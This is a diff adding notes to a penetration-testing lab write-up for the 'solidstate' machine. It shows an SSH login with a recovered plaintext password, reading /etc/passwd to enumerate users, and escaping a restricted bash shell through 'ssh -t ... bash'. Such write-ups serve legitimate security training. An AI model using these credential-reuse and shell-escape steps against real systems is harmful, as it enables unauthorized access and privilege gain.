@@ -94,7 +94,20 @@
             We find an email with the mindy account:
             
             SSH mindy - P@55W0rd1!2@
-
+    
 
 2-Exploit port 22:
-  mindy@solidstate:~$ cat user.txt
+    mindy@solidstate:~$ cat user.txt
+
+    we are in rbash env so we cannot use cd .. , etc..
+
+    we enter:
+        mindy@solidstate:~$ cat /etc/passwd
+
+    We find james is not member of restricted bash:
+        james:x:1000:1000:james:/home/james/:/bin/bash
+        mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
+
+    Escape from Restricted Bash:
+        https://book.hacktricks.xyz/network-services-pentesting/pentesting-ntp?q=How+do+you+escape+a+restricted+bash+shell+(rbash)?&ask=true
+        ssh -t mindy@10.129.196.147 bash
